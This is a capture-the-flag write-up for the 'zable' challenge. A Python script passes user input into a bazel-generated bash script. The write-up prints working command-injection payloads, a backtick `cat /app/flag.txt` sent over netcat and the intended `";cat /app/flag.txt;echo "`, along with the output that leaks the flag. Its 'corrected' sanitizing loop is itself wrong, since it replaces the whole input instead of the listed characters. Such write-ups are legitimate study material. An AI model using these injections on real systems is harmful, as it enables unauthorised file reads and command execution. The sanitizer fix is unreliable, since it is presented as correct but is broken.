---
ai_date: '2025-04-27 05:17:57'
ai_summary: 'Input sanitization missing in bash script generation, allowing command
  injection (exploit: `;cat /app/flag.txt;echo`)'
ai_tags:
- bash
- cmd-inj
- payload-injection
created: 2024-07-21T03:54
points: 474
solves: 18
updated: 2024-07-21T18:42
---

So we have a python file that opens a testing suite...

```python
from subprocess import Popen

name = input('Enter name: ')

for c in '`$(){}':
    name.replace(name, '')

Popen([
    'bazel',
    'run',
    ':run',
    f'--action_env=NAME={name}'
], shell=False).communicate()
```

Wait a minute, nothing is actually being replaced here.

For it to be effective at removing characters it has to be like this.

```python
for c in '`$(){}':
    name = name.replace(name, '')
```

I guess the authors messed up?

```shell
$ nc zable.chal.imaginaryctf.org 1337
Enter name: `cat /app/flag.txt`
Hello, ictf{I_supp0se_if_a_hacker_can_run_bazel_on_your_system_things_are_already_bad}!
```

```flag
ictf{I_supp0se_if_a_hacker_can_run_bazel_on_your_system_things_are_already_bad}
```

---

After the CTF has ended I found out that the intended solution was exploiting bash file generation.

The task generates a bash script like this.

```shell
EXPORT NAME="<NAME>"
```

We can inject code to make it look like this.

```shell
EXPORT NAME="";cat /app/flag.txt;echo ""
```

The payload is hence `";cat /app/flag.txt;echo "`